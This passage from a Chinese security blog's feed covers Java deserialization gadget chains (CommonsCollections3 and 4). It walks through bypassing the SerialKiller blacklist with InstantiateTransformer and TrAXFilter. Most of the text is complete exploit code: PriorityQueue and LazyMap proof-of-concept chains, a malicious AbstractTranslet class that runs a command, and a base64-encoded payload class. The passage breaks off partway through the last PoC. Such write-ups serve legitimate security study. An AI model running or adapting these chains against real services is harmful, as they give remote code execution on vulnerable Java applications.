class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main.java;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc4</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesclass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="comment">//name字段</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> templatesclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;ki10Moc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//恶意bytecode字段</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodeFiled</span> <span class="operator">=</span> templatesclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodeFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://Code/JavaSecurityCode/cc3/target/classes/calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodeFiled.set(templates,codes);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//工厂类字段</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> templatesclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>() &#123;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用transformer任意方法的接口,此处通过InstantiateTransformer代替InvokerTransformer</span></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123; Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        Transformer[]  transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>&lt;&gt;(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialioze(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialioze</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.CannotCompileException;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, CannotCompileException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        String AbstractTranslet=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line">        String TemplatesImpl=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        ClassPool classPool=ClassPool.getDefault();</span><br><span class="line">        classPool.appendClassPath(AbstractTranslet);</span><br><span class="line">        CtClass payload=classPool.makeClass(<span class="string">&quot;CommonsCollections44444444&quot;</span>);</span><br><span class="line">        payload.setSuperclass(classPool.get(AbstractTranslet));</span><br><span class="line">        payload.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = payload.toBytecode();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Class.forName(TemplatesImpl).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;).newInstance();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field field=templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(templates,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line"></span><br><span class="line">        Field name=templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        Transformer[] trans = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chian</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(trans);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transCom</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chian);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">com</span> <span class="operator">=</span> PriorityQueue.class.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        com.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        com.set(queue,transCom);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.out&quot;</span>));</span><br><span class="line">        outputStream.writeObject(queue);</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream inputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.out&quot;</span>));</span><br><span class="line">        inputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;相较于前面的 cc 链，多的是一个版本的更新&lt;/p&gt;
&lt;p&gt;之前都是 3.2.1&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Java安全" scheme="https://ki10moc.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Commons Collections3</title>
    <link href="https://ki10moc.github.io/2022/08/08/Commons%20Collections3/"/>
    <id>https://ki10moc.github.io/2022/08/08/Commons%20Collections3/</id>
    <published>2022-08-07T20:59:36.000Z</published>
    <updated>2023-06-18T11:27:01.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="省流"><a class="markdownIt-Anchor" href="#省流">#</a> 省流</h3><p><code>SerialKiller</code> <br> 可以通过⿊名单与⽩名单的⽅式来限制反序列化时允许通过的<br>类，其中限制了 cc1 和 cc2 中命令执行的类， <code>InvokerTransformer</code></p><p><img src="https://img-blog.csdnimg.cn/7d5ea44763ff468e8a9c67e16920cc8f.png" alt="在这里插入图片描述"></p><p><code>cc3</code>  就是为了绕过对其的限制，这里使用的是 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code>  来执行</p><p>也就是 <code>TrAXFilter</code>  的构造方法中 <code>templates.newTransformer()</code>  调⽤到  <code>TemplatesImpl</code>  ⾥的字节码<br><img src="https://img-blog.csdnimg.cn/d27e3c99816343619dd10aaa7d10fc2e.png" alt="在这里插入图片描述"></p><p>下面来看看当没有了 <code>invokerTransformer</code>  该如何调用任意方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (input <span class="keyword">instanceof</span> Class == <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(</span><br><span class="line">                    <span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span></span><br><span class="line">                        + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class) input).getConstructor(iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> con.newInstance(iArgs);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: The constructor must exist and be public &quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: InstantiationException&quot;</span>, ex);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Constructor must be public&quot;</span>, ex);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Constructor threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>判断参数如果是 <code>class</code>  类型的<br>就会创建一个类的构造器并且调用其构造方法</p><p>这里在同目录下写一个恶意程序让 poc 去调用<br>但是出现了空指针的报错<br>发现是在这个变量的地方出现的<br>那就想办法让其变量等于 <code>ABSTRACT_TRANSLET</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET))</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/94bc089ffaf04d6381bfb8139a64d307.png" alt="在这里插入图片描述"><br>也就是恶意类的父类要继承<br>即 <code>AbstractTranslet</code> <br><img src="https://img-blog.csdnimg.cn/c65407c27dfb4dad90dd0fc7ec00f72e.png" alt="在这里插入图片描述"></p><p>再次执行就成功了</p><p><img src="https://img-blog.csdnimg.cn/260eebef201c44e6a1726ff488ceb476.png" alt="在这里插入图片描述"></p><p><code>calc.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calc</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当 <code>Instantiate Transformer</code>  和 <code>TrAXFilter.TrAXFilter</code>  成功绕过可以执行任意命令<br>后面的就和 <code>cc1</code>  都一样了</p><h3 id="poc"><a class="markdownIt-Anchor" href="#poc">#</a> poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">temp</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> temp.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;ki10Moc&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> temp.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://Code/JavaSecurityCode/cc3/target/classes/calc.class&quot;</span>));</span><br><span class="line"><span class="comment">//        byte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQAHgoABgARCgASABMIABQKABIAFQcAFgcAFwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAYAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAApTb3VyY2VGaWxlAQAOVG91Y2hGaWxlLmphdmEMAAcACAcAGQwAGgAbAQAEY2FsYwwAHAAdAQAJVG91Y2hGaWxlAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAACAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAAEAAEABEADQASAAsAAAAEAAEADAAJAA0ADgACAAkAAAAmAAIAAQAAAAq4AAISA7YABFexAAAAAQAKAAAACgACAAAAFgAJABcACwAAAAQAAQAMAAEADwAAAAIAEA==&quot;);</span></span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> temp.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>() &#123;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        instantiateTransformer.transform(TrAXFilter.class);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, instantiateTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">cons</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) cons.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(</span><br><span class="line">                Map.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,</span><br><span class="line">                handler</span><br><span 